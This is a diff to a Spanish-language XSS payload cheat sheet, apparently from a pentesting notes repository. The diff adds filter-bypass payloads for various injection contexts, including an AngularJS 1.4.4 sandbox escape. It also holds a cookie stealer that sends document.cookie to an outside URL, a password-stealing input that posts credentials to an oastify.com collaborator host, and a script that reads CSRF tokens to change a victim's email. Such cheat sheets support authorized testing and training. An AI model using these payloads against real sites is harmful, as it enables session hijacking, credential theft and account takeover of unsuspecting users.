@@ -54,11 +54,12 @@ Si es que se refleja
 " onmouseover="alert(0)
 ```
 
-**Si jugamos con la declaracion de varibles**
+**Si jugamos con la declaracion de variables**
 ```javascript
 '-alert(1)-'
 kike'; alert(0); var probando='testing
 kike'; alert(0)//
+kike\'%2balert(0);// ---> siempre y cuando nos escape la '\'
 ```
 
 **Si la url esta pasando parametros por post, intentar mandarlos por GET como otro parametro aparte y cerrar los tags en los que esta encasillado**
@@ -87,15 +88,40 @@ asdas\"-alert(0)}//
 <custom id=identifier onfocus=alert(0) tabindex=1>#identifier
 ```
 
-
 **Si permite el uso de svg y anchor pero no el href**
 ```javascript
+<svg><animateTransform onbegin=alert(0)>
 <svg><a><animate attributeName=href values=javascript:alert(0) /><text x=50 y=50>Click me</text></a>
+```
+
+**Si podemos modificar parte de un canonical link tag**
+```javascript
+https://URL/?'accesskey='x'onclick='alert(0)
+```
+
+**Cerrando el tag script en el cual estaba encerrado**
+```javascript
+</script><script>alert(0)</script>
+```
+
+**Abusando del evento onclick con caracteres escapados**
+```javascript
+http://kike.com&apos;+alert(0)+&apos;
+```
+
+**Si la variable se encierra entre backticks:**
+```javascript
+${alert(0)}
+```
+
+**Si esta usando angularJS 1.4.4 y no se puede usar ' ni "**
+```javascript
+?search=&toString().constructor.prototype.charAt=[].join; [1,2]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)
 ```
 
 **Invocar alert escapando del contexto y sin parentesis ni backticks**
 ```javascript
-x=x=>{throw/**/onerror=alert,1337},toString=x,window+''
+payload(x=x=>{throw/**/onerror=alert,1337},toString=x,window+'')cierre(,{x:')
 ```
 
 **Aprovechando una HTMLi para crear un boton malicioso**
@@ -113,7 +139,7 @@ script-src-elem 'unsafe-inline'
 ### **Cookie stealer**
 ```javascript
 <script>
-	fetch("https://URL/?cookie=" + btoa(document.cookie);
+	fetch("https://URL/?cookie=" + btoa(document.cookie));
 </script>
 ```
 
@@ -152,8 +178,39 @@ script-src-elem 'unsafe-inline'
 	req.send(); 
 	function handleResponse() { 
 		var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1]; 
-		var changeReq = new XMLHttpRequest(); changeReq.open('post', '/my-account/change-email', true); 
+		var changeReq = new XMLHttpRequest(); 
+		changeReq.open('post', '/my-account/change-email', true); 
 		changeReq.send('csrf='+token+'&email=test@test.com') }; 
 </script>
 
+```
+
+## **Password stealer**
+
+```javascript
+`<input name=username id=username> <input type=password name=password onchange="if(this.value.length)fetch('https://ugee0gt5d0krro32q1x1km9wun0eo8cx.oastify.com',{ method:'POST', mode: 'no-cors', body:username.value+':'+this.value });">`
+```
+
+```javascript
+<script>
+function hax() {
+  var token = document.getElementsByName('csrf')[0].value;
+  var username = document.getElementsByName('username')[0].value;
+  var password = document.getElementsByName('password')[0].value;
+
+  var data = new FormData();
+  data.append('csrf', token);
+  data.append('postId', 8);
+  data.append('comment', `${username}:${password}`);
+  data.append('name', 'victim');
+  data.append('email', 'zenshell@zenshell.ninja');
+  data.append('website', 'http://www.zenshell.ninja');
+
+  fetch('/post/comment', {
+    method: 'POST',
+    mode: 'no-cors',
+    body: data
+  });
+}
+</script>
 ```
